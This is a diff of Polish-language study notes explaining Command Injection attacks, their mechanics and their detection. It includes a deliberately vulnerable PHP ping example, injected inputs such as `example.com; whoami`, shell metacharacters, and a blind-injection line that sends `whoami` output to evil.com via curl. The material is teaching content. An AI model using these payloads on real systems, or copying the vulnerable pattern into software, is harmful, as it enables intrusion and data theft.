@@ -4,30 +4,30 @@
 Poznanie mechaniki działania ataku Command Injection, sposobów jego wykrycia oraz zabezpieczania się przed nim.
 
 ## Co to jest 
-- jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejściowe aplikacji, które następnie trafiają do wykonania przez system operacyjny serwera. 
+Jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejściowe aplikacji, które następnie trafiają do wykonania przez system operacyjny serwera. 
 
 ## Cel 
 - uruchomienie dowolnego polecenia na serwerze, 
 - odczytanie plików systemowych (`/etc/passwd`, `/etc/shadow`),
 - pobranie i uruchomienie złośliwego skryptu, 
-- otworzenie reverse shell, 	
-- przejęcie pełnej kontroli nad systemem, 
+- otwarcie reverse shell, 	
+- przejęcie pełnej kontroli nad systemem. 
 
 ## Działanie ataku
-- aplikacja ma funkcję, która wywołuje polecenie systemowe, np. pinguje hosta podanego przez użytkownika - `system("ping -c 1 " . $GET['host']);`, 
+- aplikacja ma funkcję, która wywołuje polecenie systemowe, np. pinguje hosta podanego przez użytkownika - `system("ping -c 1 " . $_GET['host']);`, 
 - gdy użytkownik wpisuje np. example.com - aplikacja wykonuje ping example.com, 
 - atakujący wpisuje example.com; whoami, 
 - `;` kończy pierwsze polecenie i uruchamia drugie, więc system wykonuje oba, 
 - aplikacja zwraca wynik `whoami` (np. www-data) na stronie, 
-- atakujący wie, że skoro widzi wynik to ma możliwość zdalnego wykonywania poleceń, 
+- atakujący wie, że skoro widzi wynik, to ma możliwość zdalnego wykonywania poleceń, 
 - znaki używane przez atakującego:
 	- `;` - kończy pierwsze polecenie i zaczyna drugie, 
 	- `|` - przekazuje wynik jednego polecenia do drugiego, 
 	- `&&` - wykonaj drugie, jeśli pierwsze się uda, 
-	- `||` - wykonaj drugie polecenie jeśli pierwsze się nie uda, 
-	- `$(uname -a)` - wstaw wynik polecenia, (w ataku `$(uname -a)` w parametrze oznacza: wykonaj `uname -a` i wstaw jego wynik w to miejsce),  
+	- `||` - wykonaj drugie polecenie, jeśli pierwsze się nie uda, 
+	- `$(uname -a)` - wstaw wynik polecenia w to miejsce, ( np. w parametrze: wykonaj `uname -a` w parametrze oznacza: wykonaj `uname -a` i wstaw wynik),  
 	- `` ` `` - wykonaj polecenie w środku (backtick),
-- Blind Command Injection - gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera), np. `curl http://evil.com/$/(whoami)` - atakujący wysyła wynik polecenia na swój serwer.  
+- Blind Command Injection - gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera). Atakujący może także wysłać wynik do swojego serwera - np. `curl http://evil.com/$(whoami)`.  
 
 ## Jak wykryć
 - payload jest w URL - więc widać go w logach serwera: 
